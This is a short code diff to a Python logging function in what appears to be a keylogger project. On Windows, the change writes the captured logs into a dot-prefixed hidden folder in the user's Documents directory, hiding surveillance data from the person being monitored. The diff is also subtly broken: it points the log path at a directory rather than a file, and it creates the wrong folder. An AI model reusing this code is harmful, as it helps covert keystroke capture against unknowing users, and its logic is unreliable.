@@ -3,6 +3,7 @@ import re
 from datetime import datetime
 
 from constants import LOGS_DIR
+from keylogger_utils import is_windows
 
 
 def write_to_log(message: str, log_name: str) -> bool:
@@ -18,10 +19,19 @@ def write_to_log(message: str, log_name: str) -> bool:
     """
     try:
         log_path = os.path.join(LOGS_DIR, log_name)
+        log_dir = LOGS_DIR
+        if is_windows():
+            # Get the path to the user's "Documents" directory
+            documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')
 
-        if not os.path.exists(LOGS_DIR):
-            os.makedirs(LOGS_DIR)
-            print("Directory {} created successfully!".format(LOGS_DIR))
+            # Define the name of the hidden directory
+            hidden_dir_name = '.' + log_dir
+
+            # Create the full path to the hidden directory
+            log_path = os.path.join(documents_dir, hidden_dir_name)
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir)
+            print("Directory {} created successfully!".format(log_dir))
 
         if not os.path.exists(log_path):
             with open(log_path, 'w') as f:
